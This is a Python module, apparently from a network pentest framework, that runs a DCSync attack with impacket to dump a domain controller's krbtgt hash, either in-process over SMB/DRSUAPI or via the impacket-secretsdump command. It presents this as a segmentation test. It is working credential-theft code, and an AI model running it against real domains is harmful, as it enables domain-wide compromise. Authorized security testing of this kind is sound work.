"""DCSync via impacket-secretsdump. Tests segmentation (RPC replication).

For a target registered in modules/_portpatch.py:CUSTOM_PORT_TARGETS
(real SMB(445)/RPC(135) not directly reachable, only NAT-forwarded
alternates are — see test2.py for the full writeup), this switches to
calling impacket's NTDSHashes/RemoteOperations in-process instead of
shelling out to the impacket-secretsdump CLI, since only an in-process
call can be patched (a subprocess doesn't inherit our socket redirect).
For every other target, behaviour is byte-for-byte the same
ctx.run_cmd(...) call as before — this only changes anything for a
registered NAT'd target.

The in-process path deliberately uses the DRSUAPI (remote replication)
method, not VSS: NTDSHashes.dump() only takes the VSS/file branch when
handed a local NTDS.dit file, which we never provide, so
useVSSMethod=True there would silently no-op. DRSUAPI needs no local
file at all and is impacket-secretsdump's own default (no -use-vss) —
this matches the CLI path's behaviour exactly, just runnable in-process.
"""
import io
import contextlib

from modules import _portpatch

META = {
    "id": "dcsync",
    "name": "DCSync",
    "category": "AD Exploitation",
    "test_type": "pentest",
    "control": "Segmentation (RPC replication)",
    "fix": "SD-WAN",
    "mitre": ['T1003.006'],
    "cwe": [],
    "tactic": 'Credential Access',
    "requires": ["impacket-secretsdump"],
    "ports": [("tcp", 445), ("tcp", 135)],
    "success_regex": r"aad3b435|:::|krbtgt:|Kerberos keys grabbed",
    "blocked_regex": r"timed out|Connection refused|unreachable|Errno|STATUS_",
}


def _run_in_process(target, ctx):
    header = "# DCSync (in-process impacket) vs %s [custom-port patch active]\n\n" % target
    _portpatch.install(target)
    buf = io.StringIO()
    try:
        from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
        from impacket.smbconnection import SMBConnection

        smbConnection = SMBConnection(target, target, sess_port=445)
        smbConnection.login(ctx.creds["dc_user"], ctx.creds["dc_pass"], ctx.creds["domain"])

        remoteOps = RemoteOperations(smbConnection, False, None)
        remoteOps.enableRegistry()

        ntdsHashes = NTDSHashes(
            None, None, isRemote=True, history=False,
            noLMHash=True, remoteOps=remoteOps,
            useVSSMethod=False, justNTLM=False,
            pwdLastSet=False, resumeSession=None,
            outputFileName=None, justUser="krbtgt",
            printUserStatus=True,
        )
        with contextlib.redirect_stdout(buf):
            ntdsHashes.dump()
        ntdsHashes.finish()
        return header + buf.getvalue()
    except Exception as e:
        import traceback
        return header + buf.getvalue() + f"\n[ERROR] {type(e).__name__}: {e}\n{traceback.format_exc()}"
    finally:
        _portpatch.remove()


def run(target, ctx):
    if _portpatch.is_custom_port_target(target):
        return _run_in_process(target, ctx)
    return ctx.run_cmd(
        "impacket-secretsdump {domain}/{dc_user}:{dc_pass}@{target} -just-dc-user krbtgt",
        target)
